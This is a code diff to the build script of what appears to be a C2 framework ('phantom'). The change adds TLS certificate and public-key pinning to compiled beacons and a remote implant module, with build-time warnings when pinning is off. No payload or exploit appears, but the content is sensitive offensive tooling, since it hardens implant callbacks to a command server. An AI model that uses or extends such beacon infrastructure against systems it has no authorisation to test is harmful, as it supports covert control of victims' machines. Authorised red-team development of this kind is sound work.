@@ -305,10 +305,27 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                     "c2.front_cert or drop certs/front.crt.")
         except Exception:
             pass
+    _cert_pin = beacon_pin(pin_cert)
+    _pk_pin = beacon_pubkey_pin(pin_cert)
+    # A-2: a TLS beacon with NO pin and NO mTLS cannot authenticate the peer,
+    # and the runtime now fails closed. Tell the operator at BUILD time so a
+    # dead beacon is not discovered later on the target.
+    if use_ssl and not _cert_pin and not _pk_pin:
+        from phantom.utils.network import _pins_disabled
+        if _pins_disabled():
+            notifier.warn(
+                "C2 pinning is OFF (PHANTOM_BEACON_PIN=0): this beacon will "
+                "accept ANY TLS certificate. Only acceptable in a lab.")
+        else:
+            notifier.warn(
+                "HTTPS beacon has no certificate pin: no C2 certificate was "
+                "found, so the beacon fails closed and cannot check in. "
+                "Generate the listener certificate first, or opt out "
+                "explicitly with PHANTOM_BEACON_PIN=0.")
     write_beacon_c2_config(beacon_dir, host=host, port=port, use_ssl=use_ssl,
                            ps_stager_b64=ps_stager_b64, hosts=list(hosts or []),
-                           proxy=proxy or "", pin=beacon_pin(pin_cert),
-                           pins=host_pins, pubkey_pin=beacon_pubkey_pin(pin_cert),
+                           proxy=proxy or "", pin=_cert_pin,
+                           pins=host_pins, pubkey_pin=_pk_pin,
                            pubkey_pins=pubkey_pins,
                            dead_drop=dead_drop or "",
                            bootstrap_dead_drop=bootstrap_dd)
@@ -1087,7 +1104,26 @@ def compile_remote(platform: str, pkg_root: str, force_rebuild: bool = False,
     # Identity + crypto + C2 config for THIS build (fresh per build).
     _remote_identity(remote_dir)
     write_beacon_crypto_config(remote_dir, payload_token="")
-    write_beacon_c2_config(remote_dir, host=host, port=port, use_ssl=use_ssl)
+    # A-2 parity with the beacon: the remote module speaks the SAME TLS
+    # channel, so it must pin the same peer certificate (front cert when a
+    # TLS-terminating front is configured). Without this it accepted ANY TLS
+    # peer — only the HMAC authenticated the pointer, after the fact.
+    try:
+        from phantom.utils.network import (
+            beacon_pin, beacon_pubkey_pin, c2_pin_cert_path)
+        _pin_cert = c2_pin_cert_path()
+        _cert_pin = beacon_pin(_pin_cert)
+        _pk_pin = beacon_pubkey_pin(_pin_cert)
+    except Exception:
+        _cert_pin, _pk_pin = "", ""
+    if use_ssl and not _cert_pin and not _pk_pin:
+        notifier.warn(
+            "Remote module built WITHOUT a certificate pin: no C2 "
+            "certificate was found, so it will accept ANY TLS peer. "
+            "Generate the listener certificate first (lab: opt out via "
+            "PHANTOM_BEACON_PIN=0).")
+    write_beacon_c2_config(remote_dir, host=host, port=port, use_ssl=use_ssl,
+                           pin=_cert_pin, pubkey_pin=_pk_pin)
 
     main_cpp = os.path.join(src_dir, "main.cpp")
 
